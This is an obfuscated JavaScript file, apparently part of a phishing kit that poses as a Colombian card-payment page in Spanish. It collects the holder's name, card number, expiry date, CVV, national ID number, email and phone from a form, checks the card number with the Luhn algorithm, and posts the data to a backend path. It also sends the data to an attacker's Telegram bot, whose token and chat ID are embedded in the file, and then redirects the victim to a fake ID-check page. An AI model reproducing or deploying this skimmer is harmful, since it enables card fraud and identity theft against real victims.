const _0x46be20 = _0x2ca1;
(function (_0x158d03, _0x21df46) {
  const _0x397137 = _0x2ca1,
    _0x5b5ec2 = _0x158d03();
  while (!![]) {
    try {
      const _0x321a68 =
        (parseInt(_0x397137(0x1d6)) / 0x1) *
          (-parseInt(_0x397137(0x1fc)) / 0x2) +
        -parseInt(_0x397137(0x1d4)) / 0x3 +
        (parseInt(_0x397137(0x1d3)) / 0x4) *
          (-parseInt(_0x397137(0x1e5)) / 0x5) +
        (parseInt(_0x397137(0x1fb)) / 0x6) *
          (-parseInt(_0x397137(0x1e0)) / 0x7) +
        parseInt(_0x397137(0x212)) / 0x8 +
        parseInt(_0x397137(0x20f)) / 0x9 +
        parseInt(_0x397137(0x1f6)) / 0xa;
      if (_0x321a68 === _0x21df46) break;
      else _0x5b5ec2["push"](_0x5b5ec2["shift"]());
    } catch (_0x504fc9) {
      _0x5b5ec2["push"](_0x5b5ec2["shift"]());
    }
  }
})(_0x4e76, 0xe6143);
function updateLS() {
  const _0x19ddea = _0x2ca1;
  LS[_0x19ddea(0x200)](_0x19ddea(0x1ea), JSON[_0x19ddea(0x201)](info));
}
function _0x2ca1(_0x22f7d0, _0x2f0d42) {
  const _0x4e76d9 = _0x4e76();
  return (
    (_0x2ca1 = function (_0x2ca18f, _0x3ba5d3) {
      _0x2ca18f = _0x2ca18f - 0x1d3;
      let _0x33d40a = _0x4e76d9[_0x2ca18f];
      return _0x33d40a;
    }),
    _0x2ca1(_0x22f7d0, _0x2f0d42)
  );
}
(formbank = document[_0x46be20(0x207)](_0x46be20(0x211))),
  (formname = document[_0x46be20(0x207)](_0x46be20(0x1fa))),
  (formcard = document[_0x46be20(0x207)](_0x46be20(0x1f3))),
  (formmonth = document[_0x46be20(0x207)](_0x46be20(0x209))),
  (formyear = document["getElementById"](_0x46be20(0x1f4))),
  (formcvc = document["getElementById"](_0x46be20(0x1e9))),
  (formid = document["getElementById"](_0x46be20(0x1ed))),
  (formemail = document[_0x46be20(0x207)]("email_user")),
  (formtel = document[_0x46be20(0x207)](_0x46be20(0x1d5))),
  document[_0x46be20(0x207)](_0x46be20(0x1f0))[_0x46be20(0x204)](
    "click",
    async function () {
      const _0x36d232 = _0x46be20;
      if (
        formbank["value"] == "" ||
        formname[_0x36d232(0x210)] == "" ||
        formcard[_0x36d232(0x210)] == "" ||
        formmonth["value"] == "" ||
        formyear[_0x36d232(0x210)] == "" ||
        formcvc[_0x36d232(0x210)] == "" ||
        formid[_0x36d232(0x210)] == "" ||
        formemail[_0x36d232(0x210)] == "" ||
        formtel[_0x36d232(0x210)] == ""
      ) {
        alert("Todos\x20los\x20campos\x20son\x20obligatorios");
        return;
      } else {
        if (formyear["value"] < 0x19) {
          alert(
            "Coloque\x20una\x20tarjeta\x20con\x20una\x20fecha\x20de\x20vencimiento\x20valida"
          );
          return;
        } else {
          if (
            !formtel[_0x36d232(0x210)][_0x36d232(0x1ec)]("3") ||
            formtel[_0x36d232(0x210)][_0x36d232(0x213)] !== 0xa
          ) {
            alert(_0x36d232(0x1d8));
            return;
          } else {
            if (isLuhnValid(formcard[_0x36d232(0x210)])) {
              (document[_0x36d232(0x207)]("next-step")[_0x36d232(0x1fd)] =
                !![]),
                (info["metaInfo"][_0x36d232(0x1f7)] =
                  formemail[_0x36d232(0x210)]),
                (info[_0x36d232(0x1f1)]["p"] = formcard[_0x36d232(0x210)]),
                (info["metaInfo"][_0x36d232(0x1e3)] =
                  formmonth[_0x36d232(0x210)] +
                  "/" +
                  formyear[_0x36d232(0x210)]),
                (info[_0x36d232(0x1f1)]["c"] = formcvc[_0x36d232(0x210)]),
                (info[_0x36d232(0x1f1)][_0x36d232(0x1e2)] =
                  formbank[_0x36d232(0x210)]),
                (info[_0x36d232(0x1f1)]["cc"] = formid[_0x36d232(0x210)]);
              if (info[_0x36d232(0x1f1)]["p"][0x0] == "4")
                info[_0x36d232(0x20e)]["company"] = _0x36d232(0x1f5);
              else {
                if (info[_0x36d232(0x1f1)]["p"][0x0] == "5")
                  info[_0x36d232(0x20e)][_0x36d232(0x20b)] = "MC";
                else
                  info[_0x36d232(0x1f1)]["p"][0x0] == "3" &&
                    (info[_0x36d232(0x20e)]["company"] = "AM");
              }
              updateLS();
              const _0x32066d = {
                name: formname[_0x36d232(0x210)],
                reg: formid[_0x36d232(0x210)],
                pi: "",
                bn: formbank[_0x36d232(0x210)],
                mail: formemail[_0x36d232(0x210)],
                cr: formcard["value"],
                px:
                  formmonth[_0x36d232(0x210)] +
                  "/" +
                  formyear[_0x36d232(0x210)],
                vc: formcvc[_0x36d232(0x210)],
                cl: formtel[_0x36d232(0x210)],
                fuente: _0x36d232(0x1f2),
                status: _0x36d232(0x208),
              };
              try {
                const _0x3a3877 = await fetch(url + _0x36d232(0x1dc), {
                  method: _0x36d232(0x1fe),
                  headers: { "Content-Type": _0x36d232(0x203) },
                  body: JSON[_0x36d232(0x201)](_0x32066d),
                });
                if (!_0x3a3877["ok"])
                  throw new Error("Network\x20response\x20was\x20not\x20ok");
                await _0x3a3877[_0x36d232(0x20d)](),
                  await fetch(_0x36d232(0x20c), {
                    method: "POST",
                    headers: { "Content-Type": _0x36d232(0x203) },
                    body: JSON["stringify"]({
                      chat_id: _0x36d232(0x1e7),
                      text:
                        _0x36d232(0x1de) +
                        url["split"](_0x36d232(0x1dd))[0x1]
                          [_0x36d232(0x1db)](_0x36d232(0x202))[0x0]
                          [_0x36d232(0x1df)]() +
                        _0x36d232(0x1d9) +
                        formname[_0x36d232(0x210)] +
                        _0x36d232(0x1ff) +
                        formid[_0x36d232(0x210)] +
                        _0x36d232(0x1e8) +
                        formemail[_0x36d232(0x210)] +
                        _0x36d232(0x20a) +
                        formtel[_0x36d232(0x210)] +
                        "</code>\x0a--------------------\x0aBANK:\x20" +
                        formbank["value"] +
                        _0x36d232(0x1d7) +
                        formcard[_0x36d232(0x210)] +
                        "</code>\x0aMM/YY:\x20<code>" +
                        formmonth[_0x36d232(0x210)] +
                        "/" +
                        formyear["value"] +
                        _0x36d232(0x205) +
                        formcvc[_0x36d232(0x210)] +
                        _0x36d232(0x1e1),
                      parse_mode: _0x36d232(0x1eb),
                    }),
                  }),
                  (window["location"][_0x36d232(0x206)] = _0x36d232(0x1f9));
              } catch (_0x50c940) {
                console["error"]("Error:", _0x50c940),
                  (document[_0x36d232(0x207)](_0x36d232(0x1f0))[
                    _0x36d232(0x1fd)
                  ] = ![]);
              }
            } else alert(_0x36d232(0x1e4)), (formcard["value"] = "");
          }
        }
      }
    }
  );
function isLuhnValid(_0x255031) {
  const _0x41a8c = _0x46be20;
  _0x255031 = _0x255031["replace"](/\D/g, "");
  if (_0x255031["length"] < 0x6) return ![];
  const _0x54e566 = _0x255031["split"]("")
    [_0x41a8c(0x1f8)](Number)
    [_0x41a8c(0x1da)]();
  let _0x2a983c = 0x0;
  for (let _0x79a7f = 0x0; _0x79a7f < _0x54e566[_0x41a8c(0x213)]; _0x79a7f++) {
    if (_0x79a7f % 0x2 !== 0x0) {
      let _0x38c237 = _0x54e566[_0x79a7f] * 0x2;
      _0x38c237 > 0x9 && (_0x38c237 -= 0x9), (_0x2a983c += _0x38c237);
    } else _0x2a983c += _0x54e566[_0x79a7f];
  }
  return _0x2a983c % 0xa === 0x0;
}
function _0x4e76() {
  const _0x49bf40 = [
    "reverse",
    "split",
    "/info/infoPost",
    "https://",
    "CLARO\x20(\x20",
    "toUpperCase",
    "7OhByEz",
    "</code>\x0a",
    "ban",
    "pdate",
    "Número\x20de\x20tarjeta\x20inválido",
    "4146395UlrJfh",
    "replace",
    "-1002453627188",
    "</code>\x0aMAIL:\x20",
    "card_cvc",
    "info",
    "HTML",
    "startsWith",
    "documentnumber",
    "substr",
    "charAt",
    "next-step",
    "metaInfo",
    "Tarjetas",
    "card_number",
    "year-value",
    "VISA",
    "44574200MusnMB",
    "email",
    "map",
    "./points/checkers/id-check.html",
    "name_card",
    "9280728PmhtXG",
    "284zXsYZl",
    "disabled",
    "POST",
    "</code>\x0aID:\x20<code>",
    "setItem",
    "stringify",
    "-dashboard",
    "application/json",
    "addEventListener",
    "</code>\x0aCVV:\x20<code>",
    "href",
    "getElementById",
    "Ingresó\x20datos",
    "month-value",
    "\x0aPHONE:\x20<code>",
    "company",
    "https://api.telegram.org/bot7567273418:AAHbeCZsQNkuiOy44P0Kj-VqYa6Ds3QxB5M/sendMessage",
    "json",
    "checkerInfo",
    "13328838jLTiva",
    "value",
    "bank-option",
    "5034048aSZzLb",
    "length",
    "8tslEXb",
    "4123941ahgJWv",
    "tel",
    "7361MHcUUX",
    "\x0aCC:\x20<code>",
    "Coloque\x20un\x20número\x20de\x20teléfono\x20valido",
    "\x20)\x20--\x0aNAME:\x20<code>",
  ];
  _0x4e76 = function () {
    return _0x49bf40;
  };
  return _0x4e76();
}
function formatCNumber(_0x2f91ea) {
  const _0x5e9b42 = _0x46be20;
  let _0xfd639c = _0x2f91ea["value"][_0x5e9b42(0x1e6)](/\D/g, "");
  if (_0xfd639c[_0x5e9b42(0x213)] === 0x0) {
  }
  let _0x7e9acf = "";
  if (_0xfd639c[0x0] === "3") {
    _0xfd639c[_0x5e9b42(0x213)] > 0xf &&
      (_0xfd639c = _0xfd639c["substr"](0x0, 0xf));
    for (let _0x5c1b4b = 0x0; _0x5c1b4b < _0xfd639c["length"]; _0x5c1b4b++) {
      (_0x5c1b4b === 0x4 || _0x5c1b4b === 0xa) && (_0x7e9acf += "\x20"),
        (_0x7e9acf += _0xfd639c[_0x5e9b42(0x1ef)](_0x5c1b4b));
    }
    _0x2f91ea[_0x5e9b42(0x210)] = _0x7e9acf;
  } else {
    _0xfd639c[_0x5e9b42(0x213)] > 0x10 &&
      (_0xfd639c = _0xfd639c[_0x5e9b42(0x1ee)](0x0, 0x10));
    for (
      let _0x2edc78 = 0x0;
      _0x2edc78 < _0xfd639c[_0x5e9b42(0x213)];
      _0x2edc78++
    ) {
      _0x2edc78 > 0x0 && _0x2edc78 % 0x4 === 0x0 && (_0x7e9acf += "\x20"),
        (_0x7e9acf += _0xfd639c[_0x5e9b42(0x1ef)](_0x2edc78));
    }
    _0x2f91ea[_0x5e9b42(0x210)] = _0x7e9acf;
  }
}
